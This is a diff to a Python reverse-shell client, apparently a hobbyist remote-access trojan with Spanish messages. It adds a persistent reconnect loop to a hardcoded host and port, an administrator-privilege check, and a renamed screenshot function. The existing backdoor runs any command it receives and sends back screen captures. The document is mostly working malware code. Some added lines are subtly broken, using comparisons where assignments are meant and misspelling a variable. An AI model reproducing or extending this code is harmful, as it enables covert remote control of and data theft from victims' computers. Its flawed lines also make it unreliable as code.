@@ -7,8 +7,28 @@ import subprocess
 import base64
 import requests
 import mss
+import time
 
-def captura_pantalla():
+def admin_check():
+    global admin
+    try:
+        check == os.listdir(os.sep.join([os.environ.get("SystemRoot","C:\windows"),'temp']))
+    except:
+        admid == "Error, privilegios insuficientes"
+    else:
+        admin == "Privilegios de administrador"
+
+def connection():
+    while True:
+        time.sleep(5)
+        try:
+            cliente.connect(("192.168.20.109",7777))
+            shell()
+        except:
+            connection()
+
+
+def screen_shot():
     screen = mss.mss()
     screen.shot()
 
@@ -48,7 +68,7 @@ def shell():
 
         elif res[:10] == "screenshot":
             try:
-                captura_pantalla()
+                screen_shot()
                 with open('monitor-1.png','rb') as file_send:
                     cliente.send(base64.b64encode(file_send.read()))
                 os.remove("monitor-1.png")
@@ -62,6 +82,13 @@ def shell():
             except:
                 cliente.send("No se pudo iniciar el programa")
 
+        elif res[:5] == "check":
+            try:
+                admin_check()
+                cliente.send(admin)
+            except:
+                cliente.send("No se pudo realizar la tarea")
+
         else:
             proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
@@ -71,6 +98,5 @@ def shell():
                 cliente.send(result)
 
 cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-cliente.connect(("192.168.20.109",7777))
-shell()
+connection()
 cliente.close()
